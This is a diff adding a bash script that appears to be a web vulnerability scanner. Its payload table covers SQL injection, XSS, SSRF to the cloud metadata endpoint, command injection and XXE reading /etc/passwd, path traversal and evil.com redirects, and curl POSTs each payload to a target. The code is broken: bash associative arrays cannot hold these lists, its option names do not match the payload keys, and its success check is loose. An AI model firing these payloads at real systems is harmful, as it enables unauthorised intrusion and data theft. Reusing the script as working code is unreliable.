@@ -1,0 +1,121 @@
+#!/bin/bash
+
+# Built-in payloads for different injection types
+declare -A PAYLOADS
+PAYLOADS["SQLi"]=("' OR '1'='1' --" "' UNION SELECT NULL,NULL --" "admin' --")
+PAYLOADS["XSS"]=("<script>alert(1)</script>" "\" onmouseover=alert(1) ")
+PAYLOADS["SSRF"]=("http://127.0.0.1:8000" "http://169.254.169.254/latest/meta-data/")
+PAYLOADS["RCE"]=("; ls -la" "| whoami" "&& cat /etc/passwd")
+PAYLOADS["LFI"]=("../../../../etc/passwd" "..\\..\\..\\windows\\win.ini")
+PAYLOADS["IDOR"]=("?id=1" "?user=admin" "?account=9999")
+PAYLOADS["XXE"]=("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>")
+PAYLOADS["CMDi"]=("; id" "| whoami" "& echo test")
+PAYLOADS["CORS"]=("Origin: evil.com")
+PAYLOADS["Open Redirect"]=("//evil.com" "https://evil.com")
+PAYLOADS["SSTI"]=("{{7*7}}" "${7*7}")
+PAYLOADS["CRLF"]=("%0d%0aSet-Cookie:crlf=exploit")
+PAYLOADS["Mass Assignment"]=("user[role]=admin")
+PAYLOADS["NoSQL"]=("{'username': {'$ne': null}}" "{'$where': '1==1'}")
+PAYLOADS["JWT"]=("eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.")
+
+# Function to test injections
+test_injection() {
+    local url="$1"
+    local param="$2"
+    local attack_type="$3"
+    local payloads=("${PAYLOADS[$attack_type][@]}")
+    
+    for payload in "${payloads[@]}"; do
+        response=$(curl -s -X POST "$url" --data "$param=$payload")
+        if [[ "$response" == *"$payload"* || "$response" == *"200"* ]]; then
+            echo "[+] $attack_type detected on $param with payload: $payload"
+            return
+        fi
+    done
+    echo "[-] No $attack_type detected."
+}
+
+# Display Help Menu
+show_help() {
+    echo "Usage: $0 [OPTIONS]"
+    echo "Options:"
+    echo "  -u, --url URL              Target URL"
+    echo "  -p, --param PARAM          Parameter to inject"
+    echo "  --sqli                     Test for SQL Injection"
+    echo "  --xss                      Test for XSS"
+    echo "  --ssrf                     Test for SSRF"
+    echo "  --rce                      Test for Remote Code Execution"
+    echo "  --lfi                      Test for Local File Inclusion"
+    echo "  --idor                     Test for Insecure Direct Object References"
+    echo "  --xxe                      Test for XML External Entity"
+    echo "  --cmdi                     Test for Command Injection"
+    echo "  --cors                     Test for CORS Misconfiguration"
+    echo "  --open-redirect            Test for Open Redirect"
+    echo "  --ssti                     Test for Server Side Template Injection"
+    echo "  --crlf                     Test for CRLF Injection"
+    echo "  --mass-assignment          Test for Mass Assignment"
+    echo "  --nosql                    Test for NoSQL Injection"
+    echo "  --jwt                      Test for JSON Web Token vulnerabilities"
+    echo "  --custom-payload FILE      Load custom payloads from a file"
+    echo "  --all                      Run all injection tests"
+    echo "  -h, --help                 Show this help menu"
+    exit 0
+}
+
+# CLI Argument Parsing
+while [[ "$#" -gt 0 ]]; do
+    case "$1" in
+        -u|--url)
+            url="$2"
+            shift
+            shift
+            ;;
+        -p|--param)
+            param="$2"
+            shift
+            shift
+            ;;
+        --custom-payload)
+            custom_payload_file="$2"
+            shift
+            shift
+            ;;
+        --all)
+            all=true
+            shift
+            ;;
+        -h|--help)
+            show_help
+            ;;
+        --*)
+            attack_types+=("${1#--}")
+            shift
+            ;;
+        *)
+            echo "Unknown option: $1"
+            show_help
+            ;;
+    esac
+done
+
+# Load custom payloads if specified
+if [[ -n "$custom_payload_file" ]]; then
+    if [[ -f "$custom_payload_file" ]]; then
+        mapfile -t PAYLOADS["Custom"] < "$custom_payload_file"
+        attack_types+=("Custom")
+    else
+        echo "[!] Custom payload file not found: $custom_payload_file"
+        exit 1
+    fi
+fi
+
+# Execute tests
+if [[ "$all" == true ]]; then
+    for attack in "${!PAYLOADS[@]}"; do
+        test_injection "$url" "$param" "$attack"
+    done
+else
+    for attack in "${attack_types[@]}"; do
+        test_injection "$url" "$param" "$attack"
+    done
+fi
